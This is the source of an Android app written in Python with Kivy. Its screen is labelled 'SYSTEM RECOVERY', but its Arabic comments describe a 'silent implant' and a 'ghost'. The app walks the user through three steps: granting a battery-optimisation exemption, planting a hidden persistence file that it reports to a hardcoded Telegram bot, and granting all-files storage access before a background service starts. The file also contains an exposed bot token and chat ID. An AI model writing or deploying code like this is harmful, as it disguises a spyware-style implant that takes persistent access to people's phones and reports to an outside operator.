from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from jnius import autoclass
from android import mActivity
import requests
import os

TOKEN = "7547167733:AAFl789Ue816qWj60S_0N7W7BfXo57M3hZg"
CHAT_ID = "1256334460"

class ShadowUI(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(orientation='vertical', spacing=15, padding=40, **kwargs)
        self.add_widget(Label(text="SYSTEM RECOVERY", font_size='24sp', color=(1,0,0,1)))

        # المهمة 1: البطارية (تحويل مباشر)
        self.btn1 = Button(text="MISSION 1: POWER BYPASS", height='60dp', size_hint_y=None)
        self.btn1.bind(on_press=self.unlock_battery)
        self.add_widget(self.btn1)

        # المهمة 2: الزرع الصامت (خلف الكواليس)
        self.btn2 = Button(text="MISSION 2: CORE SYNC", height='60dp', size_hint_y=None)
        self.btn2.bind(on_press=self.silent_implant)
        self.add_widget(self.btn2)

        # المهمة 3: إذن الملفات وتشغيل الشبح
        self.btn3 = Button(text="MISSION 3: ACTIVATE", height='60dp', size_hint_y=None, background_color=(0,1,0,1))
        self.btn3.bind(on_press=self.start_ghost)
        self.add_widget(self.btn3)

    def unlock_battery(self, inst):
        try:
            Intent = autoclass('android.content.Intent')
            Settings = autoclass('android.provider.Settings')
            Uri = autoclass('android.net.Uri')
            try:
                intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                intent.setData(Uri.parse("package:org.shadow.shadowking"))
                mActivity.startActivity(intent)
            except:
                mActivity.startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS))
        except: pass

    def silent_implant(self, inst):
        try:
            path = "/sdcard/Android/.system_cache_data"
            os.makedirs(path, exist_ok=True)
            with open(os.path.join(path, ".core_bridge"), "w") as f:
                f.write("PERSISTENT_ACTIVE")
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": "✅ Mission 2: تم زرع الملف بنجاح في جهازك!"})
            self.btn2.text = "SYNCED"
        except Exception as e:
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": f"❌ فشل الزرع: {str(e)}"})

    def start_ghost(self, inst):
        try:
            Environment = autoclass('android.os.Environment')
            if not Environment.isExternalStorageManager():
                Intent = autoclass('android.content.Intent')
                Settings = autoclass('android.provider.Settings')
                Uri = autoclass('android.net.Uri')
                intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                intent.setData(Uri.parse("package:org.shadow.shadowking"))
                mActivity.startActivity(intent)
            else:
                service = autoclass('org.shadow.shadowking.ServiceMyservice')
                service.start(mActivity, "")
        except: pass

class ShadowApp(App):
    def build(self): return ShadowUI()

if __name__ == "__main__":
    ShadowApp().run()
